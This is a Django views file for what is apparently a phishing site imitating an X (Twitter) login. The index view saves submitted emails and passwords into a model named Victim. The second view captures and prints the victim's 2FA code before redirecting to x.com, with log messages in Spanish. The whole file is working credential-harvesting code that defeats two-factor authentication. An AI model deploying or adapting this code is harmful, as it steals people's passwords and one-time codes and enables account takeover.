from django.http import HttpResponseRedirect
from django.shortcuts import render, redirect
from .models import Victim
from .email import send_email


# Create your views here.
def index(request):
    if request.method == "GET":
        return render(request, "index.html")
    elif request.method == "POST":
        print(request.POST)
        request.session["email"] = request.POST["email"]
        Victim.objects.create(
            email=request.POST["email"], password=request.POST["password"]
        )
        try:
            send_email(request.POST["email"])
        except Exception as e:
            print(f"Error al enviar el correo: {e}")
        return redirect("2FA")


def twoFA(request):
    if request.method == "GET":
        email = request.session.get("email", "")
        return render(request, "2FA.html", {"email": email})
    if request.method == "POST":
        print(
            "El codigo 2FA de la victima "
            + request.POST["email"]
            + " es: "
            + request.POST["2FACODE"]
        )
        request.session.pop("email", None)
        return HttpResponseRedirect("https://www.x.com")
